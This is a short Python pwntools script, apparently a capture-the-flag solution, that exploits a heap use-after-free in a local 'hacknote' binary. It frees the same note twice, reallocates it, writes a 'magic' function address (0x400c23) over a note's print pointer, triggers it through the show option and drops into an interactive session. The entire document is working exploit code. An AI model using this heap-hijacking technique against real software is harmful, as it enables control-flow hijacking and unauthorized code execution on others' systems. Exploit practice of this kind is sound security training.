# Ubuntu 16
from pwn import *

def add(size , data):
    r.sendafter('ice :', str(1))
    r.sendafter('e :', str(size))
    r.sendafter('t :', data)

def show(idx):
    r.sendafter('ice :', str(3))
    r.sendlineafter('x :', str(idx))

def free(idx):
    r.sendafter('ice :', str(2))
    r.sendafter('x :', str(idx))

magic = 0x400c23
r = process('./hacknote')

add(0x10, b'A' * 0x10)
free(0)
free(0)
add(0x30, 'b' * 0x10)
add(0x10, p64(magic))
show(0)
#pause()
r.interactive()
